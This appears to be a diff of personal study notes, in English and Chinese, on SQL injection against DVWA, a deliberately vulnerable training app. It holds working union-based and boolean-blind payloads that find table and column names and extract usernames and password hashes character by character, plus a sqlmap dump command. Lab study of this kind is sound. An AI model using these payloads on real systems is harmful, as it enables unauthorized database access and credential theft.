@@ -166,12 +166,62 @@ Spli  --input parameter is char
 			id=1 union select user,password from dvwa.users#&Submit=Submit
 sqli bind # only got true or false result, so use 'and ' or 'or'. so transfer the select result to binary format of ASCII string, tell the bit 1 by 1
 	1 and substring(bin(ASCII(substring(database(),1,1))),1,1)>0#         #change the last second num to move the index of ASCII string/
-			
-			
+
+	1' union select substring(table_name,1,1),null from information_schema.tables where table_schema='dvwa'# to get the table_name
+
+	4.猜列名
+
+就直接拿 users表为例了。
+
+先猜表中的字段数目1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=8 #   （中间步骤省略了） 数目为 8
+
+猜user表各个名称，按照常规流程，从users表的第1个字段开始，对其猜解每一个组成字符，获取到完整的第1个字段名称...然后是第2/3/.../8个字段名称。当字段数目较多、名称较长的时候，若依然按照以上方式手工猜解，则会耗费比较多的时间。当时间有限的情况下，实际上有的字段可能并不太需要获取，字段的位置也暂且不作太多关注，首先获取几个包含键信息的字段，如：用户名、密码...
+
+ 
+
+ 
+
+【猜想】数据库中可能保存的字段名称
+用户名：username/user_name/uname/u_name/user/name/...
+密码：password/pass_word/pwd/pass/...
+
+所以说我们的命令就可以是 1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='user')=1 #，输出exists
+
+ 1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='password')=1 #，输出exists
+
+所以我们可以知道 users表中有 user和password。还可以试试别的
+
+ 
+
+5.猜表中的字段值
+
+同样使用二分法来做，直接写最后一步了：
+
+用户名的字段值：1' and length(substr((select user from users limit 0,1),1))=5 #，输出exists
+
+——说明user字段中第1个字段值的字符长度=5。
+
+密码的字段值：1' and length(substr((select password from users limit 0,1),1))=32 #，
+
+——说明password字段中第1个字段值的字符长度=32（基本上这么长的密码位数可能是用md5的加密方式保存的）
+
+然后再使用二分法猜解user字段的值：（用户名）
+
+1' and ascii(substr((select user from users limit 0,1),1,1))=xxx #（第一个字符）
+
+1' and ascii(substr((select user from users limit 0,1),2,1))=xxx #（第二个字符）                                            
+
+。。。。。
+
+猜解password字段的值：（密码）
+
+1' and ascii(substr((select password from users limit 0,1),1,1))=xxx #（第一个字符）
+
 	sqlmap
 		sqlmap -u "http://192.168.0.104/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=sgefsbodcapjoirl8f3t731435" -p id -D dvwa -T users --dump
 			-p schema_name, -T table_name, --dump
 			--schames --tables --columns
+
 
 
 		
